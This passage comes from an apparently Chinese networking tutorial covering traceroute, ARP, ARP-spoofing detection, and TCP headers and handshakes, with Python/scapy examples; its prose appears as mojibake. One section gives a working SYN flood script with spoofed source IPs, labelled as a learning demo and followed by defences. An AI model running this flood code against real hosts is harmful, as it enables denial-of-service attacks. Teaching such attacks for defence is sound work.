   å®¢æˆ·ç«¯ â”€â”€â”€[TTL=1]â”€â”€â”€> è·¯ç”±å™¨1 â”€â”€â”€[TTL=1]â”€â”€â”€> è·¯ç”±å™¨2 â”€â”€â”€[TTL=1]â”€â”€â”€> ç›®æ ‡ä¸»æœº

...ä¾æ­¤ç±»æ¨ï¼Œç›´åˆ°åˆ°è¾¾ç›®æ ‡
```

**å®æˆ˜ç¤ºä¾‹ï¼šå®ç°Traceroute**

```python
import socket
import struct
import time

def traceroute(dest_name, max_hops=30):
    """è¿½è¸ªè·¯ç”±è·¯å¾„"""
    dest_addr = socket.gethostbyname(dest_name)
    print(f"è¿½è¸ªåˆ° {dest_name} [{dest_addr}] çš„è·¯ç”±ï¼Œæœ€å¤š {max_hops} ä¸ªè·ƒç‚¹:\n")

    # åˆ›å»ºUDPå¥—æ¥å­—å‘é€ï¼ŒICMPå¥—æ¥å­—æ¥æ”¶
    send_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM,
                               socket.IPPROTO_UDP)
    recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                               socket.IPPROTO_ICMP)
    recv_sock.settimeout(2)

    port = 33434  # tracerouteä½¿ç”¨çš„ç«¯å£

    for ttl in range(1, max_hops + 1):
        send_sock.setsockopt(socket.SOL_IP, socket.IP_TTL, ttl)

        # å‘é€3ä¸ªæ¢æµ‹åŒ…
        recv_addr = None
        times = []

        for _ in range(3):
            send_time = time.time()
            send_sock.sendto(b'', (dest_addr, port))

            try:
                data, addr = recv_sock.recvfrom(512)
                recv_time = time.time()
                rtt = (recv_time - send_time) * 1000
                times.append(rtt)
                recv_addr = addr[0]
            except socket.timeout:
                times.append(None)

        # è¾“å‡ºç»“æœ
        if recv_addr:
            try:
                hostname = socket.gethostbyaddr(recv_addr)[0]
            except:
                hostname = recv_addr

            time_str = ' '.join([f'{t:.0f} ms' if t else '*' for t in times])
            print(f"{ttl:2d}  {time_str}  {hostname} [{recv_addr}]")

            if recv_addr == dest_addr:
                print("\nè¿½è¸ªå®Œæˆã€‚")
                break
        else:
            print(f"{ttl:2d}  * * *  è¯·æ±‚è¶…æ—¶ã€‚")

    send_sock.close()
    recv_sock.close()

# ä½¿ç”¨ç¤ºä¾‹
if __name__ == "__main__":
    traceroute("www.google.com")
```

### 4.3 ARP (Address Resolution Protocol) åè®®

#### ARPå·¥ä½œåŸç†

**ARPçš„ä½œç”¨**: å°†IPåœ°å€è§£æä¸ºMACåœ°å€

```
åœºæ™¯: ä¸»æœºA (192.168.1.10) è¦å‘é€æ•°æ®ç»™ä¸»æœºB (192.168.1.20)

æ­¥éª¤1: ä¸»æœºAå¹¿æ’­ARPè¯·æ±‚
   A: "è°æ˜¯ 192.168.1.20ï¼Ÿè¯·å‘Šè¯‰ 192.168.1.10 (MAC: AA:AA:AA:AA:AA:AA)"
   â†“ (å¹¿æ’­åˆ°æ‰€æœ‰ä¸»æœº)

æ­¥éª¤2: ä¸»æœºBå•æ’­ARPåº”ç­”
   B: "æˆ‘æ˜¯ 192.168.1.20ï¼Œæˆ‘çš„MACåœ°å€æ˜¯ BB:BB:BB:BB:BB:BB"
   â†’ (ç›´æ¥å‘é€ç»™A)

æ­¥éª¤3: ä¸»æœºAç¼“å­˜ARPæ¡ç›®
   A: 192.168.1.20 â†’ BB:BB:BB:BB:BB:BB (ç¼“å­˜)
```

#### ARPæŠ¥æ–‡æ ¼å¼

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    Hardware Type (HTYPE)      â”‚    Protocol Type (PTYPE)      â”‚
â”‚         (1 = Ethernet)        â”‚        (0x0800 = IPv4)        â”‚
â”‚          16 bits              â”‚           16 bits             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Hardware     â”‚  Protocol     â”‚         Operation             â”‚
â”‚Address Length â”‚Address Length â”‚  (1=Request, 2=Reply)         â”‚
â”‚(HLEN=6 bytes) â”‚(PLEN=4 bytes) â”‚         16 bits               â”‚
â”‚    8 bits     â”‚    8 bits     â”‚                               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚               Sender Hardware Address (SHA)                   â”‚
â”‚                  (MACåœ°å€ï¼Œ6å­—èŠ‚)                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚          Sender Protocol Address (SPA)                        â”‚
â”‚               (IPåœ°å€ï¼Œ4å­—èŠ‚)                                  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚               Target Hardware Address (THA)                   â”‚
â”‚         (ç›®æ ‡MACåœ°å€ï¼Œè¯·æ±‚æ—¶ä¸º0ï¼Œ6å­—èŠ‚)                         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚          Target Protocol Address (TPA)                        â”‚
â”‚               (ç›®æ ‡IPåœ°å€ï¼Œ4å­—èŠ‚)                              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**å­—æ®µè¯´æ˜**:

- **Hardware Type**: ç¡¬ä»¶ç±»å‹ (1 = Ethernet)
- **Protocol Type**: åè®®ç±»å‹ (0x0800 = IPv4)
- **HLEN**: ç¡¬ä»¶åœ°å€é•¿åº¦ (6å­—èŠ‚for MAC)
- **PLEN**: åè®®åœ°å€é•¿åº¦ (4å­—èŠ‚for IPv4)
- **Operation**: æ“ä½œç±»å‹
  - 1 = ARP Request (è¯·æ±‚)
  - 2 = ARP Reply (åº”ç­”)
  - 3 = RARP Request
  - 4 = RARP Reply

**å®æˆ˜ç¤ºä¾‹ï¼šARPæ¬ºéª—æ£€æµ‹ä¸é˜²å¾¡**

```python
from scapy.all import ARP, Ether, srp, sniff
import time

class ARPMonitor:
    """ARPç›‘æ§å™¨ - æ£€æµ‹ARPæ¬ºéª—"""

    def __init__(self, interface='eth0'):
        self.interface = interface
        self.arp_table = {}  # IP -> MAC æ˜ å°„è¡¨

    def get_mac(self, ip):
        """è·å–IPå¯¹åº”çš„MACåœ°å€"""
        arp = ARP(pdst=ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp

        result = srp(packet, timeout=2, verbose=0)[0]

        if result:
            return result[0][1].hwsrc
        return None

    def scan_network(self, ip_range):
        """æ‰«æç½‘ç»œä¸­çš„æ‰€æœ‰ä¸»æœº"""
        print(f"æ­£åœ¨æ‰«æç½‘ç»œ {ip_range}...")

        arp = ARP(pdst=ip_range)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp

        result = srp(packet, timeout=3, verbose=0)[0]

        clients = []
        for sent, received in result:
            clients.append({'ip': received.psrc, 'mac': received.hwsrc})
            self.arp_table[received.psrc] = received.hwsrc

        return clients

    def detect_arp_spoof(self, packet):
        """æ£€æµ‹ARPæ¬ºéª—"""
        if packet.haslayer(ARP) and packet[ARP].op == 2:  # ARP Reply
            try:
                real_mac = self.arp_table.get(packet[ARP].psrc)
                response_mac = packet[ARP].hwsrc

                if real_mac and real_mac != response_mac:
                    print(f"\n[!] æ£€æµ‹åˆ°ARPæ¬ºéª—æ”»å‡»!")
                    print(f"    IP: {packet[ARP].psrc}")
                    print(f"    çœŸå®MAC: {real_mac}")
                    print(f"    ä¼ªé€ MAC: {response_mac}")
                    return True
                else:
                    # æ›´æ–°ARPè¡¨
                    self.arp_table[packet[ARP].psrc] = response_mac

            except KeyError:
                pass

        return False

    def start_monitoring(self):
        """å¼€å§‹ç›‘æ§ARPæµé‡"""
        print(f"å¼€å§‹ç›‘æ§ {self.interface} ä¸Šçš„ARPæµé‡...")
        print("æŒ‰ Ctrl+C åœæ­¢ç›‘æ§\n")

        sniff(filter="arp", prn=self.detect_arp_spoof,
              iface=self.interface, store=0)

# ä½¿ç”¨ç¤ºä¾‹
if __name__ == "__main__":
    monitor = ARPMonitor(interface='eth0')

    # æ‰«æç½‘ç»œ
    clients = monitor.scan_network("192.168.1.0/24")
    print("\nå‘ç°çš„ä¸»æœº:")
    for client in clients:
        print(f"  IP: {client['ip']:15s}  MAC: {client['mac']}")

    print()
    # å¼€å§‹ç›‘æ§
    monitor.start_monitoring()
```

**ARPç¼“å­˜æ“ä½œ**:

```bash
# LinuxæŸ¥çœ‹ARPç¼“å­˜
arp -n

# WindowsæŸ¥çœ‹ARPç¼“å­˜
arp -a

# æ·»åŠ é™æ€ARPæ¡ç›®ï¼ˆé˜²æ­¢ARPæ¬ºéª—ï¼‰
sudo arp -s 192.168.1.1 00:11:22:33:44:55

# åˆ é™¤ARPæ¡ç›®
sudo arp -d 192.168.1.1

# æ¸…ç©ºARPç¼“å­˜
sudo ip -s -s neigh flush all
```

**å…è´¹ARP (Gratuitous ARP)**:

```
ä½œç”¨:
1. å®£å‘Šè‡ªå·±çš„IPåœ°å€ï¼Œæ£€æµ‹IPå†²çª
2. æ›´æ–°å…¶ä»–ä¸»æœºçš„ARPç¼“å­˜
3. ç”¨äºä¸»å¤‡åˆ‡æ¢ï¼ˆå¦‚VRRPï¼‰

ç‰¹ç‚¹:
- å‘é€è€…IP = ç›®æ ‡IP
- é€šå¸¸åœ¨ç½‘å¡å¯åŠ¨æ—¶å‘é€
```

```python
from scapy.all import ARP, Ether, sendp

def send_gratuitous_arp(interface, ip, mac):
    """å‘é€å…è´¹ARP"""
    arp = ARP(op=2,  # ARP Reply
              psrc=ip,
              pdst=ip,  # ç›®æ ‡IPç­‰äºæºIP
              hwsrc=mac,
              hwdst="ff:ff:ff:ff:ff:ff")  # å¹¿æ’­

    ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac)
    packet = ether / arp

    sendp(packet, iface=interface, verbose=0)
    print(f"å·²å‘é€å…è´¹ARP: IP={ip}, MAC={mac}")

# ä½¿ç”¨ç¤ºä¾‹
send_gratuitous_arp("eth0", "192.168.1.100", "00:0c:29:6f:8a:9b")
```

---

## ç¬¬äº”ç« ï¼šä¼ è¾“å±‚åè®®

### 5.1 TCP (Transmission Control Protocol) åè®®

#### TCPæ®µç»“æ„

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         Source Port           â”‚      Destination Port         â”‚
â”‚           16 bits             â”‚           16 bits             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                      Sequence Number                          â”‚
â”‚                          32 bits                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                  Acknowledgment Number                        â”‚
â”‚                          32 bits                              â”‚
â”œâ”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚Data â”‚Rsvd â”‚Nâ”‚Câ”‚Eâ”‚Uâ”‚Aâ”‚Pâ”‚Râ”‚Sâ”‚Fâ”‚                               â”‚
â”‚Offsetâ”‚     â”‚Sâ”‚Wâ”‚Câ”‚Râ”‚Câ”‚Sâ”‚Sâ”‚Yâ”‚Iâ”‚        Window Size            â”‚
â”‚4 bitsâ”‚3 bitsâ”‚1â”‚1â”‚1â”‚1â”‚1â”‚1â”‚1â”‚1â”‚1â”‚           16 bits             â”‚
â”œâ”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚           Checksum            â”‚      Urgent Pointer           â”‚
â”‚           16 bits             â”‚           16 bits             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                    Options (if any)                           â”‚
â”‚                      Variable                                 â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                          Data                                 â”‚
â”‚                      Variable                                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**å­—æ®µè¯¦è§£**:

1. **Source/Destination Port (16 bits each)**: æº/ç›®æ ‡ç«¯å£å·
   - èŒƒå›´: 0-65535
   - 0-1023: çŸ¥åç«¯å£
   - 1024-49151: æ³¨å†Œç«¯å£
   - 49152-65535: åŠ¨æ€ç«¯å£

2. **Sequence Number (32 bits)**: åºåˆ—å·
   - æ ‡è¯†å‘é€çš„å­—èŠ‚æµä½ç½®
   - åˆå§‹å€¼éšæœºç”Ÿæˆï¼ˆISNï¼‰
   - ç”¨äºæ•°æ®æ’åºå’Œé‡ä¼ 

3. **Acknowledgment Number (32 bits)**: ç¡®è®¤å·
   - æœŸæœ›æ¥æ”¶çš„ä¸‹ä¸€ä¸ªå­—èŠ‚çš„åºåˆ—å·
   - ACKæ ‡å¿—ä¸º1æ—¶æœ‰æ•ˆ

4. **Data Offset (4 bits)**: æ•°æ®åç§»
   - TCPå¤´éƒ¨é•¿åº¦
   - å•ä½: 32ä½å­—(4å­—èŠ‚)
   - èŒƒå›´: 5-15 (20-60å­—èŠ‚)

5. **Reserved (3 bits)**: ä¿ç•™å­—æ®µ

6. **Flags (9 bits)**: æ§åˆ¶æ ‡å¿—
   ```
   NS  (1 bit): ECN-nonce
   CWR (1 bit): Congestion Window Reduced
   ECE (1 bit): ECN-Echo
   URG (1 bit): Urgent pointeræœ‰æ•ˆ
   ACK (1 bit): Acknowledgmentæœ‰æ•ˆ
   PSH (1 bit): PushåŠŸèƒ½
   RST (1 bit): Resetè¿æ¥
   SYN (1 bit): Synchronizeåºåˆ—å·
   FIN (1 bit): Finishï¼Œå‘é€æ–¹å®Œæˆå‘é€
   ```

7. **Window Size (16 bits)**: çª—å£å¤§å°
   - æ¥æ”¶çª—å£å¤§å°ï¼ˆå­—èŠ‚ï¼‰
   - ç”¨äºæµé‡æ§åˆ¶

8. **Checksum (16 bits)**: æ ¡éªŒå’Œ
   - æ ¡éªŒå¤´éƒ¨ã€æ•°æ®å’Œä¼ªå¤´éƒ¨

9. **Urgent Pointer (16 bits)**: ç´§æ€¥æŒ‡é’ˆ
   - URG=1æ—¶æœ‰æ•ˆ
   - æŒ‡å‘ç´§æ€¥æ•°æ®çš„æœ€åä¸€ä¸ªå­—èŠ‚

10. **Options (Variable)**: é€‰é¡¹å­—æ®µ
    - MSS (Maximum Segment Size): æœ€å¤§æ®µå¤§å°
    - Window Scale: çª—å£æ‰©å¤§å› å­
    - SACK (Selective Acknowledgment): é€‰æ‹©æ€§ç¡®è®¤
    - Timestamps: æ—¶é—´æˆ³

#### TCPä¸‰æ¬¡æ¡æ‰‹

```
å®¢æˆ·ç«¯                                  æœåŠ¡å™¨
   â”‚                                      â”‚
   â”‚                                      â”‚  (LISTENçŠ¶æ€)
   â”‚                                      â”‚
   â”‚â”€â”€â”€â”€â”€ SYN (seq=x) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’  â”‚  æ­¥éª¤1: SYN
   â”‚  (SYN_SENTçŠ¶æ€)                      â”‚  (SYN_RCVDçŠ¶æ€)
   â”‚                                      â”‚
   â”‚â†â”€â”€â”€ SYN+ACK (seq=y, ack=x+1) â”€â”€â”€â”€â”€  â”‚  æ­¥éª¤2: SYN+ACK
   â”‚                                      â”‚
   â”‚                                      â”‚
   â”‚â”€â”€â”€â”€â”€ ACK (seq=x+1, ack=y+1) â”€â”€â”€â”€â”€â”€â†’ â”‚  æ­¥éª¤3: ACK
   â”‚  (ESTABLISHEDçŠ¶æ€)                   â”‚  (ESTABLISHEDçŠ¶æ€)
   â”‚                                      â”‚
   â”‚ â•â•â•â•â•â•â• æ•°æ®ä¼ è¾“ â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â”‚
   â”‚                                      â”‚
```

**è¯¦ç»†äº¤äº’è¿‡ç¨‹**:

```
æ­¥éª¤1: å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ (SYN)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ SYN = 1                              â”‚
â”‚ ACK = 0                              â”‚
â”‚ Seq = ISN_client (å¦‚ 1000)           â”‚
â”‚ Ack = 0                              â”‚
â”‚ Options: MSS=1460, Window Scale=7    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

æ­¥éª¤2: æœåŠ¡å™¨ â†’ å®¢æˆ·ç«¯ (SYN+ACK)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ SYN = 1                              â”‚
â”‚ ACK = 1                              â”‚
â”‚ Seq = ISN_server (å¦‚ 2000)           â”‚
â”‚ Ack = ISN_client + 1 (1001)          â”‚
â”‚ Options: MSS=1460, Window Scale=7    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

æ­¥éª¤3: å®¢æˆ·ç«¯ â†’ æœåŠ¡å™¨ (ACK)
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ SYN = 0                              â”‚
â”‚ ACK = 1                              â”‚
â”‚ Seq = ISN_client + 1 (1001)          â”‚
â”‚ Ack = ISN_server + 1 (2001)          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**ä¸ºä»€ä¹ˆéœ€è¦ä¸‰æ¬¡æ¡æ‰‹ï¼Ÿ**

1. **é˜²æ­¢æ—§è¿æ¥**: é¿å…å·²å¤±æ•ˆçš„è¿æ¥è¯·æ±‚çªç„¶åˆä¼ é€åˆ°æœåŠ¡å™¨
2. **åŒå‘ç¡®è®¤**: ç¡®è®¤åŒæ–¹çš„å‘é€å’Œæ¥æ”¶èƒ½åŠ›éƒ½æ­£å¸¸
3. **åŒæ­¥åºåˆ—å·**: åŒæ–¹äº¤æ¢åˆå§‹åºåˆ—å·ï¼ˆISNï¼‰

**SYN Floodæ”»å‡»ä¸é˜²å¾¡**:

```python
from scapy.all import IP, TCP, send
import random

def syn_flood(target_ip, target_port, count=100):
    """SYN Floodæ”»å‡»æ¼”ç¤ºï¼ˆä»…ç”¨äºå­¦ä¹ ï¼‰"""
    print(f"[!] è­¦å‘Š: è¿™æ˜¯æ”»å‡»æ¼”ç¤ºä»£ç ï¼Œä»…ç”¨äºå®‰å…¨å­¦ä¹ ")
    print(f"æ­£åœ¨å‘ {target_ip}:{target_port} å‘é€SYNåŒ…...")

    for i in range(count):
        # éšæœºæºIPå’Œæºç«¯å£
        src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}." \
                 f"{random.randint(1,254)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)

        # æ„é€ SYNåŒ…
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=src_port, dport=target_port, flags='S',
                  seq=random.randint(0, 2**32-1))

        send(ip/tcp, verbose=0)

        if (i+1) % 10 == 0:
            print(f"å·²å‘é€ {i+1} ä¸ªSYNåŒ…")

# é˜²å¾¡SYN Flood
"""
1. SYN Cookies: ä¸ä¿å­˜åŠè¿æ¥çŠ¶æ€
2. å¢å¤§SYNé˜Ÿåˆ—: sysctl -w net.ipv4.tcp_max_syn_backlog=4096
3. å‡å°‘SYN-ACKé‡ä¼ æ¬¡æ•°: sysctl -w net.ipv4.tcp_synack_retries=1
4. ä½¿ç”¨é˜²ç«å¢™é™åˆ¶: iptables -A INPUT -p tcp --syn -m limit --limit 1/s -j ACCEPT
"""
```

#### TCPå››æ¬¡æŒ¥æ‰‹

```
å®¢æˆ·ç«¯                                  æœåŠ¡å™¨
   â”‚                                      â”‚
   â”‚â”€â”€â”€â”€â”€ FIN (seq=u) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’  â”‚  æ­¥éª¤1: FIN
   â”‚  (FIN_WAIT_1çŠ¶æ€)                    â”‚  (CLOSE_WAITçŠ¶æ€)
   â”‚                                      â”‚
   â”‚â†â”€â”€â”€â”€ ACK (ack=u+1) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€  â”‚  æ­¥éª¤2: ACK
   â”‚  (FIN_WAIT_2çŠ¶æ€)                    â”‚
   â”‚                                      â”‚
   â”‚                                      â”‚  (æœåŠ¡å™¨ç»§ç»­å‘é€æ•°æ®)
   â”‚                                      â”‚
   â”‚â†â”€â”€â”€â”€ FIN (seq=v) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚  æ­¥éª¤3: FIN
   â”‚  (TIME_WAITçŠ¶æ€)                     â”‚  (LAST_ACKçŠ¶æ€)
   â”‚                                      â”‚
   â”‚â”€â”€â”€â”€â”€ ACK (ack=v+1) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚  æ­¥éª¤4: ACK
   â”‚                                      â”‚  (CLOSEDçŠ¶æ€)
   â”‚  (ç­‰å¾…2MSLåCLOSED)                  â”‚
   â”‚                                      â”‚
```

**TIME_WAITçŠ¶æ€çš„æ„ä¹‰**:

```
1. ç¡®ä¿æœ€åçš„ACKèƒ½å¤Ÿåˆ°è¾¾
   - å¦‚æœæœ€åçš„ACKä¸¢å¤±ï¼ŒæœåŠ¡å™¨ä¼šé‡ä¼ FIN
   - TIME_WAITçŠ¶æ€å¯ä»¥å“åº”é‡ä¼ çš„FIN

2. ç¡®ä¿æ—§è¿æ¥çš„æ•°æ®åŒ…åœ¨ç½‘ç»œä¸­æ¶ˆå¤±
   - ç­‰å¾…æ—¶é—´: 2MSL (Maximum Segment Lifetime)
   - MSLé€šå¸¸ä¸º30ç§’-2åˆ†é’Ÿ
   - 2MSL = 4åˆ†é’Ÿå·¦å³
```

**å®æˆ˜ç¤ºä¾‹ï¼šTCPè¿æ¥ç®¡ç†**

```python
import socket
import struct
import time

class TCPConnection:
    """TCPè¿æ¥ç®¡ç†"""

    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.state = 'CLOSED'

    def connect(self, host, port):
        """å»ºç«‹TCPè¿æ¥"""
        print(f"[*] æ­£åœ¨è¿æ¥ {host}:{port}...")
        print(f"    çŠ¶æ€: {self.state} -> SYN_SENT")

        try:
            self.sock.connect((host, port))
            self.state = 'ESTABLISHED'
            print(f"    çŠ¶æ€: SYN_SENT -> ESTABLISHED")
            print(f"[+] è¿æ¥æˆåŠŸ!")

            # è·å–è¿æ¥ä¿¡æ¯
            local_addr = self.sock.getsockname()
            remote_addr = self.sock.getpeername()
            print(f"    æœ¬åœ°åœ°å€: {local_addr[0]}:{local_addr[1]}")
            print(f"    è¿œç¨‹åœ°å€: {remote_addr[0]}:{remote_addr[1]}")

            return True
        except Exception as e:
            print(f"[-] è¿æ¥å¤±è´¥: {e}")
            self.state = 'CLOSED'
            return False

    def send_data(self, data):
        """å‘é€æ•°æ®"""
        if self.state != 'ESTABLISHED':
            print("[-] è¿æ¥æœªå»ºç«‹")
            return False

        try:
            self.sock.sendall(data)
            print(f"[+] å·²å‘é€ {len(data)} å­—èŠ‚")
            return True
        except Exception as e:
            print(f"[-] å‘é€å¤±è´¥: {e}")
            return False

    def receive_data(self, buffer_size=4096):
        """æ¥æ”¶æ•°æ®"""
        if self.state != 'ESTABLISHED':
            print("[-] è¿æ¥æœªå»ºç«‹")
            return None

        try:
            data = self.sock.recv(buffer_size)
            print(f"[+] å·²æ¥æ”¶ {len(data)} å­—èŠ‚")
            return data
        except Exception as e:
            print(f"[-] æ¥æ”¶å¤±è´¥: {e}")
            return None

    def close(self):
        """å…³é—­è¿æ¥"""
        if self.state == 'CLOSED':
            return

        print(f"\n[*] æ­£åœ¨å…³é—­è¿æ¥...")
        print(f"    çŠ¶æ€: {self.state} -> FIN_WAIT_1")

        self.sock.close()
        self.state = 'CLOSED'

        print(f"    çŠ¶æ€: FIN_WAIT_1 -> FIN_WAIT_2 -> TIME_WAIT -> CLOSED")
